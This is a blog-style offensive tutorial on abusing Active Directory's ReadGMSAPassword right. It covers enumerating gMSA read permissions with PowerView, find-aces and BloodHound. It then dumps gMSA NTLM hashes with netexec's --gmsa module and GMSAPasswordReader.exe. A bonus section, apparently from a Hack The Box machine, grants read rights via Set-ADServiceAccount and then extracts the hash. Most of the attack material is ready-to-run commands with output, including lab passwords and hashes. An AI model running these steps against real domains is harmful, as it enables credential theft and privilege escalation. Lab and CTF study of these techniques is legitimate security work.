---
title: ⚔️DACL - ReadGMSAPassword
date: 2025-10-28 01:09:00 +/-TTTT
categories: [DACL]
tags: [ReadGMSAPassword]     # TAG names should always be lowercase
image : /assets/images/readgmsapasswordbackground.png
---
> Author : lineeralgebra
{:.prompt-tip}

# **ReadGMSAPassword**

### **What is a GMSA?**

**GMSA** stands for **Group Managed Service Account**.

- It’s a type of **Active Directory account** designed for **services, scheduled tasks, or apps**.
- The key idea: **Windows automatically manages the password** — you don’t have to set or rotate it manually.
- The account can be used on **one or more allowed computers** in the domain.

**Benefits of GMSA:**

1. No manual password management.
2. Automatic password rotation by the domain controller.
3. Can be used across multiple machines safely.
4. Works only on allowed computers (controlled by `PrincipalsAllowedToRetrieveManagedPassword`).

## **ReadGMSAPassword Verify**

### **ReadGMSAPassword Verify with PowerView**

```bash
powershell-import /home/elliot/tools/PowerView.ps1

powerpick Get-ADServiceAccount -Filter * | Where-Object { $_.ObjectClass -eq "msDS-GroupManagedServiceAccount" } | Select Name, DistinguishedName
```

![alt text](../assets/images/dacl121.png)

### **ReadGMSAPassword Verify with find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\osman:iloveyou@VALENOR-DC01.lab.local"
Type 'help' to see available commands.
$ 

```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl122.png)

### **ReadGMSAPassword Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl123.png)

## **ReadGMSAPassword Attack**

### **ReadGMSAPassword Attack with netexec**

We can use easily `--gmsa` module from **LDAP**

```bash
nxc ldap VALENOR-DC01.lab.local -u osman -p iloveyou --gmsa
LDAP        192.168.1.10    389    VALENOR-DC01     [*] Windows 10 / Server 2019 Build 17763 (name:VALENOR-DC01) (domain:lab.local)
LDAPS       192.168.1.10    636    VALENOR-DC01     [+] lab.local\osman:iloveyou 
LDAPS       192.168.1.10    636    VALENOR-DC01     [*] Getting GMSA Passwords
LDAPS       192.168.1.10    636    VALENOR-DC01     Account: GMSA1$               NTLM: 0f38e5403ccf33edaecde96b0d95952f     PrincipalsAllowedToReadPassword: GMSA-Users
LDAPS       192.168.1.10    636    VALENOR-DC01     Account: test-websvc$         NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA-WebServers
```

### **ReadGMSAPassword Attack with GMSAPasswordReader.exe**

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/GMSAPasswordReader.exe

we can use this great tool with `execute-assembly` 

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/GMSAPasswordReader.exe --AccountName "GMSA1$" 
```

![alt text](../assets/images/dacl124.png)

## GMSA (BONUS)

![alt text](../assets/images/haze5.png)

### GMSA_MANAGERS write permission

we  are member of `GMSA_MANAGERS` and this is really usefull we can check ACL's with
https://github.com/L1nvx/find-aces

```
python3 main.py --auth "ldap+ntlm-password://haze.htb\\\\mark.adams:Ld@p_Auth_Sp1unk@2k24@DC01.haze.htb"
$ find_object_aces gMSA_Managers
05:46:34 - INFO - Found group: gMSA_Managers

================================================================================
ACE #1
Object DN: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Object SID: S-1-5-21-323145914-28650650-2368316563-1111
--------------------------------------------------------------------------------
  ACE Type: 5
  SID: S-1-5-21-323145914-28650650-2368316563-1107
  Permissions: ADS_RIGHT_DS_WRITE_PROP
  Object Type: 888eedd6-ce04-df40-b462-b8a50e41ba38
  Inherited Type: -

================================================================================
ACE #2
Object DN: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Object SID: S-1-5-21-323145914-28650650-2368316563-1111
--------------------------------------------------------------------------------
  ACE Type: 0
  SID: S-1-5-21-323145914-28650650-2368316563-1107
  Permissions: READ_CONTROL, ADS_RIGHT_DS_READ_PROP
  Object Type: -
  Inherited Type: -

================================================================================
ACE #3
Object DN: CN=Support_Services,CN=Users,DC=haze,DC=htb
Object SID: S-1-5-21-323145914-28650650-2368316563-1112
--------------------------------------------------------------------------------
  ACE Type: 0
  SID: S-1-5-21-323145914-28650650-2368316563-1111
  Permissions: WRITE_OWNER
  Object Type: -
  Inherited Type: -

================================================================================
ACL expansion complete. Total ACEs found: 3
================================================================================

================================================================================
PERMISSION RELATIONS WITH RESOLVED OBJECT TYPES
================================================================================
CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
└── [READ_CONTROL, ADS_RIGHT_DS_READ_PROP, ADS_RIGHT_DS_WRITE_PROP] → (ms-DS-GroupMSAMembership)
    └── CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
        └── [WRITE_OWNER] → (No Object Type)
            └── CN=Support_Services,CN=Users,DC=haze,DC=htb

```

![alt text](../assets/images/haze6.png)

We have Write Permission on it then we can add in `ReadGmsaPassword` permission and we can use this with mark.adams. and boommm

```
*Evil-WinRM* PS C:\\Backups> Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "gMSA_Managers"
*Evil-WinRM* PS C:\\Backups> Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword

DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=gMSA_Managers,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :

```

and now we can

```
nxc ldap DC01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -k --gmsa
LDAP        DC01.haze.htb   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAPS       DC01.haze.htb   636    DC01             [+] haze.htb\\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       DC01.haze.htb   636    DC01             [*] Getting GMSA Passwords
LDAPS       DC01.haze.htb   636    DC01             Account: Haze-IT-Backup$      NTLM: 1b49f312a7619ca460290ecefd4dfcb7     PrincipalsAllowedToReadPassword: gMSA_Managers

```